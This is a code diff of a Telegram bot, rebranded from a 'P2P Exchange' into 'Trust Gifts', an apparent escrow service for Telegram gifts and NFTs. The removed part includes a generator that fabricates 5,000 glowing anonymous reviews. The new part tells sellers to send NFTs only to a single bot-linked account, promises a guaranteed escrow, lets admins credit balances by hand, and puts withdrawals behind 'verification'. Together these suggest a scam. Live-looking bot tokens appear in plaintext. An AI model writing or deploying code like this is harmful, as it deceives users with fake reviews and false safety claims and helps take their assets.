@@ -15,13 +15,12 @@ from aiohttp import web
 # ============================================================
 # 1. КОНФИГУРАЦИЯ
 # ============================================================
-BOT_TOKEN = "8635441956:AAHTu9Q9Lqw6_IIkVmo3vIT5AEu9BJyFhTg"
+BOT_TOKEN = "8684423252:AAGinUz7SsqWE1sEw0xRUrIwtyxmjSpsXCg"
 MASTER_ADMIN_ID = 8986358602
-BOT_USERNAME = "exchangeerobot"
-BOT_NAME = "P2P Exchange"
-CHANNEL_LINK = "https://t.me/tonkeeper_news"
+BOT_USERNAME = "Trustnftgiftbot"
+BOT_NAME = "Trust Gifts"
+NFT_ESCROW_ACCOUNT = "Trustnftgift"
 MINI_APP_URL = "https://saitminiapp.onrender.com"
-SUPPORT_LINK = "@supexchangerf"
 
 bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
 dp = Dispatcher()
@@ -33,13 +32,14 @@ FILES = {
     "deals": "deals.json",
     "admins": "admins.json",
     "balance": "balance.json",
-    "reviews": "reviews.json",
     "verification": "verification.json",
     "verification_requests": "verification_requests.json",
     "withdraw": "withdraw_requests.json",
     "logs": "logs.json",
     "user_language": "user_language.json",
-    "stats": "stats.json"
+    "stats": "stats.json",
+    "rekvisits": "rekvisits.json",
+    "tickets": "tickets.json"
 }
 
 def load_json(file):
@@ -55,200 +55,17 @@ def save_json(file, data):
 deals = load_json(FILES["deals"])
 admins = load_json(FILES["admins"])
 balance = load_json(FILES["balance"])
-reviews = load_json(FILES["reviews"])
 verification_data = load_json(FILES["verification"])
 verification_requests = load_json(FILES["verification_requests"])
 withdraw_requests = load_json(FILES["withdraw"])
 logs = load_json(FILES["logs"])
 user_language = load_json(FILES["user_language"])
 stats = load_json(FILES["stats"])
+rekvisits = load_json(FILES["rekvisits"])
+tickets = load_json(FILES["tickets"])
 
 # ============================================================
-# 3. ГЕНЕРАЦИЯ ОТЗЫВОВ
-# ============================================================
-def generate_reviews():
-    if len(reviews) >= 5000:
-        return
-    review_texts = [
-        "Отличная платформа! Всё работает быстро и надёжно.",
-        "Лучший P2P обменник! Рекомендую всем друзьям.",
-        "Быстро, удобно, безопасно. Буду пользоваться дальше.",
-        "Отличная поддержка! Помогли разобраться с выводом.",
-        "Наконец-то нашёл нормальный обменник. Всё честно.",
-        "Сделал первую сделку, всё прошло гладко. Спасибо!",
-        "За сутки сделал 5 сделок, все успешно завершены.",
-        "Очень доволен сервисом. Вывод моментальный.",
-        "Пользуюсь уже месяц, ни одной проблемы.",
-        "Лучший сервис в Telegram! Успехов разработчикам."
-    
-    ]
-    for i in range(5000):
-        review_id = str(uuid.uuid4())[:8]
-        reviews[review_id] = {
-            "id": review_id,
-            "user": "Аноним",
-            "rating": random.randint(4, 5),
-            "text": random.choice(review_texts),
-            "anonymous": True,
-            "date": datetime.now().strftime("%d.%m.%Y %H:%M"),
-            "user_id": None
-        }
-    save_json(FILES["reviews"], reviews)
-
-generate_reviews()
-
-# ============================================================
-# 4. ЯЗЫКИ
-# ============================================================
-LANGUAGES = {
-    "ru": "🇷🇺 Русский",
-    "en": "🇬🇧 English"
-}
-
-LOCALE = {
-    "ru": {
-        "bot_name": "P2P Exchange",
-        "bot_desc": "БЕЗОПАСНЫЕ СДЕЛКИ",
-        "feature1": "Честные сделки между продавцами и покупателями",
-        "feature2": "TON | STARS | RUB | UAH",
-        "feature3": "Гарант безопасности с обеих сторон",
-        "feature4": "Премиум поддержка 24/7",
-        "how_it_works": "КАК ЭТО РАБОТАЕТ",
-        "step1": "Продавец создаёт сделку в Mini App",
-        "step2": "Продавец отправляет ссылку покупателю",
-        "step3": "Покупатель оплачивает в Mini App",
-        "step4": "Продавец подтверждает передачу в Mini App",
-        "step5": "Покупатель подтверждает получение в Mini App",
-        "step6": "Деньги зачисляются на баланс продавца",
-        "our_channel": "НАШ КАНАЛ",
-        "support": "ПОДДЕРЖКА",
-        "support_contact": "@supexchangerf",
-        "start_now": "НАЧНИ ПРЯМО СЕЙЧАС",
-        "create_deal": "СОЗДАТЬ СДЕЛКУ",
-        "my_balance": "МОЙ БАЛАНС",
-        "my_deals": "МОИ СДЕЛКИ",
-        "how_to_deal": "КАК СОЗДАТЬ СДЕЛКУ",
-        "faq": "ОТЗЫВЫ",
-        "channel": "КАНАЛ",
-        "admin_panel": "АДМИН",
-        "choose_action": "ВЫБЕРИТЕ ДЕЙСТВИЕ",
-        "your_balance": "ВАШ БАЛАНС",
-        "main_menu": "ГЛАВНОЕ МЕНЮ",
-        "no_deals": "У ВАС НЕТ СДЕЛОК",
-        "your_deals": "ВАШИ СДЕЛКИ",
-        "deal_not_found": "СДЕЛКА НЕ НАЙДЕНА",
-        "access_denied": "ДОСТУП ЗАПРЕЩЁН",
-        "payment_confirmed": "ОПЛАТА ПОДТВЕРЖДЕНА",
-        "seller_confirmed": "ВЫ ПОДТВЕРДИЛИ ПЕРЕДАЧУ",
-        "buyer_confirmed": "ВЫ ПОДТВЕРДИЛИ ПОЛУЧЕНИЕ",
-        "deal_completed": "СДЕЛКА ЗАВЕРШЕНА",
-        "insufficient_balance": "НЕДОСТАТОЧНО СРЕДСТВ",
-        "status_waiting": "ОЖИДАНИЕ ОПЛАТЫ",
-        "status_paid": "ОПЛАЧЕНО",
-        "status_awaiting": "ОЖИДАНИЕ ПОДТВЕРЖДЕНИЯ",
-        "status_completed": "ЗАВЕРШЕНО",
-        "select_language": "ВЫБРАТЬ ЯЗЫК",
-        "welcome": "ДОБРО ПОЖАЛОВАТЬ",
-        "choose_language_prompt": "🌐 ВЫБЕРИТЕ ВАШ ЯЗЫК:",
-        "product": "ТОВАР",
-        "amount": "СУММА",
-        "seller": "ПРОДАВЕЦ",
-        "buyer": "ПОКУПАТЕЛЬ",
-        "deal": "СДЕЛКА",
-        "waiting_for_delivery": "ОЖИДАНИЕ ПЕРЕДАЧИ",
-        "seller_delivered": "ПРОДАВЕЦ ПЕРЕДАЛ",
-        "confirm_receipt": "ПОДТВЕРДИТЬ ПОЛУЧЕНИЕ",
-        "contact_support": "В ПОДДЕРЖКУ",
-        "balance_added": "БАЛАНС НАЧИСЛЕН",
-        "admin_rights": "НЕДОСТАТОЧНО ПРАВ",
-        "admin_added": "АДМИН ДОБАВЛЕН",
-        "admin_removed": "АДМИН УДАЛЁН",
-        "admin_list": "СПИСОК АДМИНОВ",
-        "no_deals_total": "НЕТ СДЕЛОК",
-        "all_deals_title": "ВСЕ СДЕЛКИ",
-        "no_active_requests": "НЕТ АКТИВНЫХ ЗАЯВОК",
-        "copy_link": "СКОПИРОВАТЬ ССЫЛКУ",
-        "deal_link_text": "ССЫЛКА ДЛЯ ПОКУПАТЕЛЯ",
-        "send_link_to_buyer": "ОТПРАВЬТЕ ССЫЛКУ ПОКУПАТЕЛЮ",
-        "deal_created": "СДЕЛКА СОЗДАНА",
-        "how_to_deal_text": "📖 <b>КАК СОЗДАТЬ СДЕЛКУ</b>\n\n1️⃣ Нажмите «СОЗДАТЬ СДЕЛКУ»\n   → Откроется Mini App\n\n2️⃣ Заполните форму в Mini App:\n   • Название товара\n   • Валюту (TON/STARS/RUB/UAH)\n   • Сумму\n   • Username покупателя\n\n3️⃣ В Mini App выберите способ оплаты:\n   • С баланса — мгновенно\n   • По реквизитам — после проверки админом\n\n4️⃣ Отправьте ссылку покупателю\n\n5️⃣ После оплаты в Mini App:\n   • Продавец нажимает «Передал товар»\n   • Покупатель нажимает «Получил товар»\n   • Деньги зачисляются на баланс\n\n🔥 ВСЕ ОПЕРАЦИИ ТОЛЬКО В MINI APP!"
-    },
-    "en": {
-        "bot_name": "P2P Exchange",
-        "bot_desc": "SECURE DEALS",
-        "feature1": "Fair deals between sellers and buyers",
-        "feature2": "TON | STARS | RUB | UAH",
-        "feature3": "Security guarantee from both sides",
-        "feature4": "Premium 24/7 support",
-        "how_it_works": "HOW IT WORKS",
-        "step1": "Seller creates deal in Mini App",
-        "step2": "Seller sends link to buyer",
-        "step3": "Buyer pays in Mini App",
-        "step4": "Seller confirms delivery in Mini App",
-        "step5": "Buyer confirms receipt in Mini App",
-        "step6": "Money credited to seller's balance",
-        "our_channel": "OUR CHANNEL",
-        "support": "SUPPORT",
-        "support_contact": "@supexchangerf",
-        "start_now": "START NOW",
-        "create_deal": "CREATE DEAL",
-        "my_balance": "MY BALANCE",
-        "my_deals": "MY DEALS",
-        "how_to_deal": "HOW TO CREATE DEAL",
-        "faq": "REVIEWS",
-        "channel": "CHANNEL",
-        "admin_panel": "ADMIN",
-        "choose_action": "CHOOSE ACTION",
-        "your_balance": "YOUR BALANCE",
-        "main_menu": "MAIN MENU",
-        "no_deals": "YOU HAVE NO DEALS",
-        "your_deals": "YOUR DEALS",
-        "deal_not_found": "DEAL NOT FOUND",
-        "access_denied": "ACCESS DENIED",
-        "payment_confirmed": "PAYMENT CONFIRMED",
-        "seller_confirmed": "YOU CONFIRMED DELIVERY",
-        "buyer_confirmed": "YOU CONFIRMED RECEIPT",
-        "deal_completed": "DEAL COMPLETED",
-        "insufficient_balance": "INSUFFICIENT BALANCE",
-        "status_waiting": "WAITING FOR PAYMENT",
-        "status_paid": "PAID",
-        "status_awaiting": "AWAITING CONFIRMATION",
-        "status_completed": "COMPLETED",
-        "select_language": "SELECT LANGUAGE",
-        "welcome": "WELCOME",
-        "choose_language_prompt": "🌐 SELECT YOUR LANGUAGE:",
-        "product": "PRODUCT",
-        "amount": "AMOUNT",
-        "seller": "SELLER",
-        "buyer": "BUYER",
-        "deal": "DEAL",
-        "waiting_for_delivery": "WAITING FOR DELIVERY",
-        "seller_delivered": "SELLER DELIVERED",
-        "confirm_receipt": "CONFIRM RECEIPT",
-        "contact_support": "CONTACT SUPPORT",
-        "balance_added": "BALANCE ADDED",
-        "admin_rights": "INSUFFICIENT RIGHTS",
-        "admin_added": "ADMIN ADDED",
-        "admin_removed": "ADMIN REMOVED",
-        "admin_list": "ADMIN LIST",
-        "no_deals_total": "NO DEALS",
-        "all_deals_title": "ALL DEALS",
-        "no_active_requests": "NO ACTIVE REQUESTS",
-        "copy_link": "COPY LINK",
-        "deal_link_text": "LINK FOR BUYER",
-        "send_link_to_buyer": "SEND LINK TO BUYER",
-        "deal_created": "DEAL CREATED",
-        "how_to_deal_text": "📖 <b>HOW TO CREATE A DEAL</b>\n\n1️⃣ Click 'CREATE DEAL'\n   → Opens Mini App\n\n2️⃣ Fill in the form in Mini App:\n   • Product name\n   • Currency (TON/STARS/RUB/UAH)\n   • Amount\n   • Buyer's username\n\n3️⃣ Choose payment method in Mini App:\n   • From balance — instantly\n   • By details — after admin check\n\n4️⃣ Send the link to the buyer\n\n5️⃣ After payment in Mini App:\n   • Seller clicks 'Delivered'\n   • Buyer clicks 'Received'\n   • Money goes to balance\n\n🔥 ALL OPERATIONS ONLY IN MINI APP!"
-    }
-}
-
-def get_text(lang: str, key: str) -> str:
-    if lang in LOCALE and key in LOCALE[lang]:
-        return LOCALE[lang][key]
-    return LOCALE["ru"].get(key, key)
-
-# ============================================================
-# 5. ПОМОЩНИКИ
+# 3. ПОМОЩНИКИ
 # ============================================================
 def is_admin(user_id: int) -> bool:
     return user_id == MASTER_ADMIN_ID or str(user_id) in admins
@@ -302,31 +119,28 @@ async def log_to_master(text: str):
     except:
         pass
 
-# ============================================================
-# 6. FSM (ТОЛЬКО ДЛЯ АДМИНА)
-# ============================================================
-class AdminStates(StatesGroup):
-    waiting_user_id = State()
-    waiting_currency = State()
-    waiting_amount = State()
+def log_action(action: str, data: dict):
+    log_id = str(uuid.uuid4())[:8]
+    logs[log_id] = {
+        "id": log_id,
+        "time": datetime.now().isoformat(),
+        "action": action,
+        "data": data
+    }
+    save_json(FILES["logs"], logs)
 
 # ============================================================
-# 7. КЛАВИАТУРЫ (КОМПАКТНЫЕ)
+# 4. КЛАВИАТУРЫ
 # ============================================================
 def main_menu_keyboard(user_id: int):
-    lang = get_user_language(user_id)
     buttons = [
         [
-            InlineKeyboardButton(text="📱 Создать", web_app=WebAppInfo(url=MINI_APP_URL)),
+            InlineKeyboardButton(text="📱 Создать сделку", web_app=WebAppInfo(url=MINI_APP_URL)),
             InlineKeyboardButton(text="💰 Баланс", callback_data="menu_balance"),
         ],
         [
-            InlineKeyboardButton(text="📊 Сделки", callback_data="menu_deals"),
-            InlineKeyboardButton(text="📖 Как создать", callback_data="how_to_deal"),
-        ],
-        [
-            InlineKeyboardButton(text="⭐️ Отзывы", callback_data="menu_reviews"),
-            InlineKeyboardButton(text="📢 Канал", callback_data="menu_channel"),
+            InlineKeyboardButton(text="📊 Мои сделки", callback_data="menu_deals"),
+            InlineKeyboardButton(text="📖 Гайд", callback_data="how_to_deal"),
         ],
         [
             InlineKeyboardButton(text="🌐 Язык", callback_data="select_language"),
@@ -338,30 +152,29 @@ def main_menu_keyboard(user_id: int):
         ])
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
-def admin_panel_keyboard(user_id: int):
-    lang = get_user_language(user_id)
+def admin_panel_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💰 Начислить", callback_data="admin_add_balance")],
         [InlineKeyboardButton(text="👥 Админы", callback_data="admin_manage_admins")],
         [InlineKeyboardButton(text="📊 Все сделки", callback_data="admin_all_deals")],
         [InlineKeyboardButton(text="💲 Выводы", callback_data="admin_withdraw_requests")],
-        [InlineKeyboardButton(text="⭐️ Отзывы", callback_data="admin_manage_reviews")],
+        [InlineKeyboardButton(text="🔐 Верификация", callback_data="admin_verification")],
+        [InlineKeyboardButton(text="🎫 Тикеты", callback_data="admin_tickets")],
         [InlineKeyboardButton(text="📋 Логи", callback_data="admin_logs")],
         [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
         [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
     ])
 
 def back_to_main_keyboard(user_id: int):
-    lang = get_user_language(user_id)
     return InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
     ])
 
 def language_keyboard():
-    buttons = []
-    for lang_code, lang_name in LANGUAGES.items():
-        buttons.append([InlineKeyboardButton(text=lang_name, callback_data=f"set_lang_{lang_code}")])
-    return InlineKeyboardMarkup(inline_keyboard=buttons)
+    return InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="set_lang_ru")],
+        [InlineKeyboardButton(text="🇬🇧 English", callback_data="set_lang_en")],
+    ])
 
 def currency_keyboard():
     return InlineKeyboardMarkup(inline_keyboard=[
@@ -372,17 +185,46 @@ def currency_keyboard():
     ])
 
 def mini_app_keyboard(text: str, page: str = ""):
-    """Кнопка с Mini App вместо текстовой ссылки"""
     url = MINI_APP_URL
     if page:
         url += f"?page={page}"
     return InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text=text, web_app=WebAppInfo(url=url))],
-        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
     ])
 
 # ============================================================
-# 8. ОБРАБОТЧИКИ БОТА
+# 5. ГАЙД
+# ============================================================
+GUIDE_TEXT = """📖 <b>КАК ПРОВЕСТИ БЕЗОПАСНУЮ СДЕЛКУ</b>
+
+1️⃣ <b>Создайте сделку</b> в Mini App
+   → Выберите категорию (NFT/Подарок, Аккаунт игры, Другое)
+   → Укажите товар и сумму
+   → Вставьте ссылку на NFT (если продаёте NFT)
+
+2️⃣ <b>Отправьте ссылку</b> покупателю
+   → Скопируйте ссылку из Mini App
+   → Отправьте в личные сообщения
+
+3️⃣ <b>Покупатель оплачивает</b> в Mini App
+   → С баланса (мгновенно)
+   → По реквизитам (после проверки админом)
+
+4️⃣ <b>Продавец передаёт товар</b>
+   → Нажимает кнопку «Передал товар» в Mini App
+   → <b>⚠️ ВАЖНО: NFT передаётся ТОЛЬКО на @{NFT_ESCROW_ACCOUNT}</b>
+
+5️⃣ <b>Покупатель подтверждает</b> получение
+   → Нажимает «Подтвердить получение» в Mini App
+   → Деньги зачисляются продавцу
+
+🔒 <b>НИКОГДА НЕ ПЕРЕДАВАЙТЕ ТОВАР ДО ОПЛАТЫ!</b>
+
+🛡️ Все сделки защищены эскроу-гарантом."""
+
+# ============================================================
+# 6. ОБРАБОТЧИКИ
 # ============================================================
 @dp.message(Command("start"))
 async def cmd_start(message: types.Message):
@@ -395,31 +237,27 @@ async def cmd_start(message: types.Message):
     
     if not lang:
         await message.answer(
-            f"🌐 {get_text('ru', 'choose_language_prompt')}",
+            "🌐 Выберите ваш язык / Select your language:",
             reply_markup=language_keyboard()
         )
         return
     
     welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥
 
-{get_text(lang, 'bot_desc')}
-• {get_text(lang, 'feature1')}
-• {get_text(lang, 'feature2')}
-• {get_text(lang, 'feature3')}
-• {get_text(lang, 'feature4')}
+🚀 <b>БЕЗОПАСНЫЙ ОБМЕН</b>
+• Telegram-подарки, NFT и аккаунты
+• TON | STARS | RUB | UAH
+• Эскроу-гарант с двух сторон
 
-📊 {get_text(lang, 'how_it_works')}:
-1️⃣ {get_text(lang, 'step1')}
-2️⃣ {get_text(lang, 'step2')}
-3️⃣ {get_text(lang, 'step3')}
-4️⃣ {get_text(lang, 'step4')}
-5️⃣ {get_text(lang, 'step5')}
-6️⃣ {get_text(lang, 'step6')}
+📖 КАК РАБОТАЕТ:
+1️⃣ Продавец создаёт сделку в Mini App
+2️⃣ Отправляет ссылку покупателю
+3️⃣ Покупатель оплачивает в Mini App
+4️⃣ Продавец передаёт товар
+5️⃣ Покупатель подтверждает получение
+6️⃣ Деньги зачисляются продавцу
 
-📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
-🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}
-
-🔥 {get_text(lang, 'start_now')} 🚀"""
+🔥 НАЧНИ ПРЯМО СЕЙЧАС 🚀"""
     
     await message.answer(welcome_text, reply_markup=main_menu_keyboard(message.from_user.id))
 
@@ -427,76 +265,63 @@ async def cmd_start(message: types.Message):
 async def set_language(callback: types.CallbackQuery):
     lang = callback.data.split("_")[2]
     set_user_language(callback.from_user.id, lang)
-    await callback.answer(f"✅ {get_text(lang, 'welcome')}")
+    await callback.answer(f"✅ Язык установлен")
     
     welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥
 
-{get_text(lang, 'bot_desc')}
-• {get_text(lang, 'feature1')}
-• {get_text(lang, 'feature2')}
-• {get_text(lang, 'feature3')}
-• {get_text(lang, 'feature4')}
+🚀 <b>БЕЗОПАСНЫЙ ОБМЕН</b>
+• Telegram-подарки, NFT и аккаунты
+• TON | STARS | RUB | UAH
+• Эскроу-гарант с двух сторон
 
-📊 {get_text(lang, 'how_it_works')}:
-1️⃣ {get_text(lang, 'step1')}
-2️⃣ {get_text(lang, 'step2')}
-3️⃣ {get_text(lang, 'step3')}
-4️⃣ {get_text(lang, 'step4')}
-5️⃣ {get_text(lang, 'step5')}
-6️⃣ {get_text(lang, 'step6')}
+📖 КАК РАБОТАЕТ:
+1️⃣ Продавец создаёт сделку в Mini App
+2️⃣ Отправляет ссылку покупателю
+3️⃣ Покупатель оплачивает в Mini App
+4️⃣ Продавец передаёт товар
+5️⃣ Покупатель подтверждает получение
+6️⃣ Деньги зачисляются продавцу
 
-📢 {get_text(lang, 'our_channel')}: {CHANNEL_LINK}
-🆘 {get_text(lang, 'support')}: {get_text(lang, 'support_contact')}
-
-🔥 {get_text(lang, 'start_now')} 🚀"""
+🔥 НАЧНИ ПРЯМО СЕЙЧАС 🚀"""
     
     await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id))
 
 @dp.callback_query(lambda c: c.data == "select_language")
 async def select_language(callback: types.CallbackQuery):
     await callback.message.edit_text(
-        f"🌐 {get_text('ru', 'choose_language_prompt')}",
+        "🌐 Выберите ваш язык / Select your language:",
         reply_markup=language_keyboard()
     )
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "back_to_main")
 async def back_to_main(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    await callback.message.edit_text(
-        f"🔥 <b>{BOT_NAME}</b> 🔥\n\n{get_text(lang, 'choose_action')}:",
-        reply_markup=main_menu_keyboard(callback.from_user.id)
-    )
-    await callback.answer()
+    welcome_text = f"""🔥 <b>{BOT_NAME}</b> 🔥
 
-@dp.callback_query(lambda c: c.data == "menu_channel")
-async def menu_channel(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    text = f"""📢 {get_text(lang, 'our_channel')}
+🚀 <b>БЕЗОПАСНЫЙ ОБМЕН</b>
+• Telegram-подарки, NFT и аккаунты
+• TON | STARS | RUB | UAH
+• Эскроу-гарант с двух сторон
 
-🔥 {CHANNEL_LINK}
-
-🚀 Подписывайся!"""
-    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
+🔥 ВЫБЕРИТЕ ДЕЙСТВИЕ:"""
+    await callback.message.edit_text(welcome_text, reply_markup=main_menu_keyboard(callback.from_user.id))
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "how_to_deal")
 async def how_to_deal(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    text = get_text(lang, 'how_to_deal_text')
+    text = GUIDE_TEXT.format(NFT_ESCROW_ACCOUNT=NFT_ESCROW_ACCOUNT)
     await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
     await callback.answer()
 
 # ============================================================
-# 9. БАЛАНС
+# 7. БАЛАНС
 # ============================================================
 @dp.callback_query(lambda c: c.data == "menu_balance")
 async def menu_balance(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
     bal = get_balance(callback.from_user.id)
     verif_status = "🔓 Доступен" if is_verified(callback.from_user.id) else "🔒 Требуется верификация"
     
-    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>
+    text = f"""💰 <b>ВАШ БАЛАНС</b>
 
 💎 TON: {bal.get('ton', 0)}
 ⭐️ STARS: {bal.get('stars', 0)}
@@ -511,7 +336,7 @@ async def menu_balance(callback: types.CallbackQuery):
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
         [InlineKeyboardButton(text="💲 Вывод", callback_data="start_withdraw")],
-        [InlineKeyboardButton(text="◀️ Назад", callback_data="back_to_main")]
+        [InlineKeyboardButton(text="◀️ На главную", callback_data="back_to_main")]
     ])
     
     await callback.message.edit_text(text, reply_markup=keyboard)
@@ -519,84 +344,61 @@ async def menu_balance(callback: types.CallbackQuery):
 
 @dp.callback_query(lambda c: c.data == "menu_deals")
 async def menu_deals(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
     user_deals = []
     for d_id, d in deals.items():
-        if d.get("seller_id") == callback.from_user.id:
+        if d.get("seller_id") == callback.from_user.id or d.get("buyer_id") == callback.from_user.id:
             user_deals.append((d_id, d))
     
     if not user_deals:
         await callback.message.edit_text(
-            f"📭 {get_text(lang, 'no_deals')}",
+            "📭 У вас нет сделок",
             reply_markup=back_to_main_keyboard(callback.from_user.id)
         )
         return
     
-    text = f"📊 <b>{get_text(lang, 'your_deals')}</b>\n\n"
+    text = "📊 <b>МОИ СДЕЛКИ</b>\n\n"
     for d_id, d in user_deals[-10:]:
         status_map = {
-            "waiting_payment": f"⏳ {get_text(lang, 'status_waiting')}",
-            "paid": f"✅ {get_text(lang, 'status_paid')}",
-            "awaiting_confirmation": f"📦 {get_text(lang, 'status_awaiting')}",
-            "completed": f"🎉 {get_text(lang, 'status_completed')}"
+            "waiting_payment": "⏳ Ожидает оплаты",
+            "paid": "✅ Оплачено",
+            "awaiting_confirmation": "📦 Ожидает подтверждения",
+            "completed": "🎉 Завершено"
         }
-        text += f"#{d_id} | {status_map.get(d['status'], d['status'])} | {d['amount']} {d['currency']}\n"
-        text += f"   → {d['product'][:30]}\n\n"
-    
-    await callback.message.edit_text(text, reply_markup=back_to_main_keyboard(callback.from_user.id))
-    await callback.answer()
-
-# ============================================================
-# 10. ОТЗЫВЫ
-# ============================================================
-@dp.callback_query(lambda c: c.data == "menu_reviews")
-async def menu_reviews(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    reviews_list = list(reviews.values())
-    
-    if not reviews_list:
-        text = f"⭐️ <b>{get_text(lang, 'faq')}</b>\n\nПока нет отзывов"
-    else:
-        text = f"⭐️ <b>{get_text(lang, 'faq')}</b> (всего: {len(reviews_list)})\n\n"
-        for r in reviews_list[-10:]:
-            user = r.get('user', 'Аноним')
-            rating = '⭐' * r.get('rating', 5)
-            text += f"👤 <b>{user}</b> | {rating}\n"
-            text += f"📝 {r.get('text', '')[:150]}\n"
-            text += f"🕐 {r.get('date', 'недавно')}\n\n"
+        text += f"#{d_id} | {status_map.get(d['status'], d['status'])}\n"
+        text += f"   💰 {d['amount']} {d['currency']} | {d['product'][:25]}\n"
+        text += f"   👤 Продавец: @{d.get('seller_username', '?')} → @{d.get('buyer_username', '?')}\n\n"
     
     await callback.message.edit_text(text[:4000], reply_markup=back_to_main_keyboard(callback.from_user.id))
     await callback.answer()
 
 # ============================================================
-# 11. ОБРАБОТКА ССЫЛКИ НА СДЕЛКУ
+# 8. ССЫЛКА НА СДЕЛКУ
 # ============================================================
 async def handle_deal_link(message: types.Message, deal_id: str):
-    lang = get_user_language(message.from_user.id)
     if deal_id not in deals:
-        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
+        await message.answer("❌ Сделка не найдена")
         return
 
     deal = deals[deal_id]
     if deal["status"] != "waiting_payment":
-        await message.answer(f"❌ {get_text(lang, 'deal_not_found')}")
+        await message.answer("❌ Сделка уже обработана")
         return
 
     if message.from_user.username and message.from_user.username.lower() != deal["buyer_username"].lower():
         await message.answer(
-            f"❌ {get_text(lang, 'access_denied')}!\n\n"
-            f"{get_text(lang, 'deal')} #{deal_id} {get_text(lang, 'for_user')} @{deal['buyer_username']}"
+            f"❌ Доступ запрещён!\n\n"
+            f"Сделка #{deal_id} для @{deal['buyer_username']}"
         )
         return
 
     deal["buyer_id"] = message.from_user.id
     save_json(FILES["deals"], deals)
 
-    text = f"""✈️ <b>{get_text(lang, 'deal')} #{deal_id}</b>
+    text = f"""✈️ <b>СДЕЛКА #{deal_id}</b>
 
-📦 {get_text(lang, 'product')}: {deal['product']}
-💰 {get_text(lang, 'amount')}: {deal['amount']} {deal['currency']}
-👤 {get_text(lang, 'seller')}: @{deal['seller_username']}
+📦 Товар: {deal['product']}
+💰 Сумма: {deal['amount']} {deal['currency']}
+👤 Продавец: @{deal['seller_username']}
 
 ⬇️ ПЕРЕЙДИТЕ В MINI APP ДЛЯ ОПЛАТЫ"""
 
@@ -606,14 +408,12 @@ async def handle_deal_link(message: types.Message, deal_id: str):
     )
 
 # ============================================================
-# 12. ВЫВОД
+# 9. ВЫВОД
 # ============================================================
 @dp.callback_query(lambda c: c.data == "start_withdraw")
 async def start_withdraw(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
-    
     if not is_verified(callback.from_user.id):
-        text = f"""⚠️ <b>{get_text(lang, 'verification_required')}</b>
+        text = f"""⚠️ <b>ТРЕБУЕТСЯ ВЕРИФИКАЦИЯ</b>
 
 🔐 Пройдите верификацию в Mini App"""
         
@@ -624,17 +424,17 @@ async def start_withdraw(callback: types.CallbackQuery):
         return
     
     bal = get_balance(callback.from_user.id)
-    verif_data = verification_data[str(callback.from_user.id)]
+    verif_data = verification_data.get(str(callback.from_user.id), {})
     
-    text = f"""💰 <b>{get_text(lang, 'your_balance')}</b>
+    text = f"""💰 <b>ВАШ БАЛАНС</b>
 
 💎 TON: {bal.get('ton', 0)}
 ⭐️ STARS: {bal.get('stars', 0)}
 💰 RUB: {bal.get('rub', 0)}
 🌐 UAH: {bal.get('uah', 0)}
 
-🔑 Ваш код: {verif_data.get('code', 'неизвестно')}
-🕐 Сессия активна до: {verif_data.get('expires_at', 'неизвестно')[:19]}
+🔑 Код верификации: {verif_data.get('code', 'неизвестно')}
+🕐 Сессия активна до: {verif_data.get('expires_at', 'неизвестно')[:19] if verif_data.get('expires_at') else 'неизвестно'}
 
 📱 Вывод средств в Mini App"""
     
@@ -645,44 +445,45 @@ async def start_withdraw(callback: types.CallbackQuery):
     await callback.answer()
 
 # ============================================================
-# 13. АДМИН ПАНЕЛЬ
+# 10. АДМИН
 # ============================================================
+class AdminStates(StatesGroup):
+    waiting_user_id = State()
+    waiting_currency = State()
+    waiting_amount = State()
+
 @dp.callback_query(lambda c: c.data == "menu_admin")
 async def menu_admin(callback: types.CallbackQuery):
-    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
     await callback.message.edit_text(
-        f"👑 <b>{get_text(lang, 'admin_panel')}</b>\n\n{get_text(lang, 'choose_action')}:",
-        reply_markup=admin_panel_keyboard(callback.from_user.id)
+        "👑 <b>АДМИН ПАНЕЛЬ</b>\n\nВыберите действие:",
+        reply_markup=admin_panel_keyboard()
     )
     await callback.answer()
 
 @dp.callback_query(lambda c: c.data == "admin_add_balance")
 async def admin_add_balance(callback: types.CallbackQuery, state: FSMContext):
-    lang = get_user_language(callback.from_user.id)
     if not is_admin(callback.from_user.id):
-        await callback.answer(f"⛔ {get_text(lang, 'access_denied')}", show_alert=True)
+        await callback.answer("⛔ Доступ запрещён", show_alert=True)
         return
-    await callback.message.edit_text(f"💰 <b>{get_text(lang, 'balance_added')}</b>\n\nВведите ID пользователя:")
